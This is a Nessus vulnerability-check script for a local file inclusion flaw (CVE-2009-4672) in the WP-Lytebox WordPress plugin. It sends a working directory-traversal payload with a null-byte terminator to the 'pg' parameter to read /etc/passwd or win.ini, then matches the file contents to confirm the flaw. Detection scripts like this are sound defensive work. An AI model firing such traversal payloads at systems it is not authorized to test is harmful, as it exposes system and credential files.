#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(38925);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/05");

  script_cve_id("CVE-2009-4672");
  script_bugtraq_id(35098);
  script_xref(name:"EDB-ID", value:"8791");

  script_name(english:"WP-Lytebox 'pg' Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running WP-Lytebox, a plugin for WordPress that
uses Lytebox to add a lightbox functionality to HTML content.

The version of WP-Lytebox installed on the remote host fails to filter
user-supplied input to the 'pg' parameter of the 'main.php' script
before using it to include PHP code. Regardless of PHP's
'register_globals' setting, an unauthenticated attacker can exploit
this issue to view arbitrary files or possibly to execute arbitrary
PHP code on the remote host, subject to the privileges of the web
server user id.");
  script_set_attribute(attribute:"see_also", value:"http://grupenet.com/category/wordpress/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/12/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/05/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:grupenet:wp-lytebox");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "WP-Lytebox";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "wp-lytebox/lytebox.css"][0] =
    make_list('lbDetails', 'lbNumberDisplay');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext     : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');
files = make_list(files, "license.txt");

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['license.txt'] = "GNU GENERAL PUBLIC LICENSE";

# Loop through files to look for.
foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
  else traversal = '../../../../';

  if (substr(file, strlen(file)-4) == ".txt")
    exploit = string(traversal, substr(file, 0, strlen(file)-4-1));
  else
    exploit = string(traversal, file, "%00");

  url = "/wp-content/plugins/wp-lytebox/main.php?pg=" + exploit;

  res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

  # There's a problem if...
  body = res[2];
  file_pat = file_pats[file];
  if (
    # we see the expected contents or...
    egrep(pattern:file_pat, string:body) ||
    # we get an error because magic_quotes was enabled or...
    file + "\\0.txt" >< body ||
    # we get an error claiming the file doesn't exist or...
    file + "): failed to open stream: No such file" >< body ||
    file + ") [function.include]: failed to open stream: No such file" >< body ||
    file + ") [<a href='function.include'>function.include</a>]: failed to open stream: No such file" >< body ||
    # we get an error about open_basedir restriction.
    file + ") [function.include]: failed to open stream: Operation not permitted" >< body ||
    file + ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted" >< body ||
    "open_basedir restriction in effect. File(" + file >< body
  )
  {
    if (report_verbosity > 0)
    {
      if (egrep(pattern:file_pat, string:body))
      {
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report =
          '\n' +
          'Nessus was able to exploit the issue to retrieve the contents of\n'+
          "'" + file + "' on the remote host using the following URL :" +
          '\n\n' +
          '  ' + install_url + url + '\n';

        if (report_verbosity > 1)
        {
          snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
          contents = strstr(body, "r6_c2.gif");
          contents = strstr(contents, 'valign="top">') - 'valign="top">';
          contents = strstr(contents, '\n   ') - '\n   ';
          contents = contents - strstr(contents, "   </td>");
          contents = data_protection::redact_etc_passwd(output:contents);
          report +=
            '\n' +
            'This produced the following truncated output :\n' +
            '\n' +
            snip + '\n' + beginning_of_response(resp:contents, max_lines:'10')+
            snip + '\n';
        }
      }
      else
      {
        report =
          '\n' +
          'Nessus was able to verify the issue exists using the following \n'+
          'URL :\n' +
          '\n' +
          '  ' + install_url + url + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
